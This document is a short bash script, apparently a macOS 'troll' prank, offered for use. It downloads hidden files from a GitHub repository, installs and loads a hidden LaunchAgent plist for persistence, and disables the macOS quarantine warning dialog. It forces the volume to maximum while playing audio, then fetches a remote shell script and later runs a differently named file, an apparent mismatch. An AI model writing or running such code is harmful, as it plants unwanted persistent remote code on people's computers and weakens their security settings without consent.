#! /bin/bash
curl -L https://raw.githubusercontent.com/Me1955/osx_troll/main/HT.mp3 --output ~/Desktop/.troll.mp3

curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/main.plist >> ~/Library/LaunchAgents/.main.plist
chmod 777 ~/Library/LaunchAgents/.main.plist
launchctl load ~/Library/LaunchAgents/.main.plist

#Disable the “Are you sure you want to open this application?” dialog
defaults write com.apple.LaunchServices LSQuarantine -bool false

caffeinate &
afplay ~/Desktop/.troll.mp3 &

end=$((SECONDS+360))

while [ $SECONDS -lt $end ]; do
	osascript -e 'set volume 100'
done

curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh >> ~/Desktop/.run.sh
chmod 777 ~/Desktop/.music.sh
sleep 30m
sh ~/Desktop/.music.sh
